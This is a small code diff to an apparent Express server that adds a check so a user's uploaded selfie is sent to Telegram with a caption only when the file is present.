@@ -140,8 +140,10 @@ if (accountName) lines.push(`<b>Account Name:</b> ${accountName}`);
     });   
     
     // Send selfie to Telegram with a caption if there is one
-        const caption = `📸 Selfie from: ${name}`;
+        if (selfieFile) {
+            const caption = `📸 Selfie from: ${name}`;
           sendPhotoToTelegram(selfieFile.path, caption);
+        }
 });
 
 // Error handling middleware
